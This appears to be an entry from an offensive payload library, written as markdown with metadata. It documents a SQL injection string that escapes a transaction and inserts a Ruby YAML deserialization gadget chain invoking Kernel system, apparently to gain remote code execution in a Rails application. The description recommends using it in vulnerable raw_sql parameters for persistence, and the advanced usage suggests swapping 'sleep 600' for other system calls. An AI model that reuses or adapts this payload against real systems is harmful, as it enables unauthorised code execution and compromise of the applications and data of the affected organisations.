---
data: >-
  SELECT 1; ROLLBACK; INSERT INTO user_versions (item_type, item_id, event,
  email, object) VALUES ('User', 2, 'update',
  'uniquekeywordtotriggercode@hackerone.com', '--- username: -
  !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y -
  !ruby/object:Gem::Requirement requirements:
  !ruby/object:Gem::Package::TarReader io: &1 !ruby/object:Net::BufferedIO io:
  &1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: "abc"
  debug_output: &1 !ruby/object:Net::WriteAdapter socket: &1
  !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket:
  !ruby/module ''Kernel'' method_id: :system git_set: sleep 600 method_id:
  :resolve ' ); --
tags:
  - sqli
  - injection
type: command
output: null
executor: sql
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:25.912Z'
id: 46ecbd87-2bd3-4ae2-bdf8-cb420ed86102
verified: false
validated: true
submitted: true
---
# malicious-sqli-payload

## Command

```sql
SELECT 1; ROLLBACK; INSERT INTO user_versions (item_type, item_id, event, email, object) VALUES ('User', 2, 'update', 'uniquekeywordtotriggercode@hackerone.com', '--- username: - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &1 !ruby/object:Net::BufferedIO io: &1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: "abc" debug_output: &1 !ruby/object:Net::WriteAdapter socket: &1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module ''Kernel'' method_id: :system git_set: sleep 600 method_id: :resolve ' ); --
```

## Description

This SQL command exploits injection to run a benign SELECT, escape the transaction with ROLLBACK, insert a YAML payload into user_versions, and comment out the rest. Use in vulnerable raw_sql parameters for persistence.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| N/A | Full payload as single string | Yes |

## Examples

### Basic Usage

```sql
SELECT 1; ROLLBACK; INSERT INTO user_versions ... --
```

### Advanced Usage

Adapt the YAML object for different RCE payloads, e.g., replace sleep 600 with other system calls.

## Expected Output

Query succeeds without error; record inserted and committed due to escaped transaction.

## Related

- [[Related Procedure]]
